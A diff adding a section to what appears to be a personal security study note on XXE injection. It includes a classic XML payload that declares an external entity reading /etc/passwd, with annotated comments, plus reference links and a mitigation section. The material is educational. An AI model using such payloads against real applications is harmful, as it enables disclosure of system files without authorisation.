@@ -14,6 +14,29 @@ Portswigger example of stock level in  shopping application:
 3. Blind XXE to exfiltrate data out-of-band
 4. Blind XXE to retrieve data via error messages
 
+## XXE XML Entity injection
+See [[XML-Basics]] for more about XML
+```xml
+<!--Last Line of Request -->
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (ANY)> <!-- REF: (#ANY) instead of (ANY) -->
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]> 
+<xmlEntityInjection>
+	<Author>Hacker1</Author> 
+	<Subject>&file;</Subject>>
+	<Content>LearnDaXMLs3</Content>
+</xmlEntityInjection>
+
+<!--Notes -->
+<!-- Creates a Header-->
+<!-- System call to file variable->
+<!-- Prints address file with &file -->
+<!-- The two section must connect -->
+```
+[PayloadsAllTheThings - XXE ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/Classic%20XXE%20-%20etc%20passwd.xml)
 
 ## Mediation
 
@@ -27,3 +50,4 @@ Configuration of a XML interperter disallowing the inclusion of external entitie
 [Portswigger](https://portswigger.net/web-security/xxe)
 [BrightSec](https://brightsec.com/blog/xxe-attack/)
 [OWASP](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
+[PayloadsAllTheThings - XXE ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/Classic%20XXE%20-%20etc%20passwd.xml)
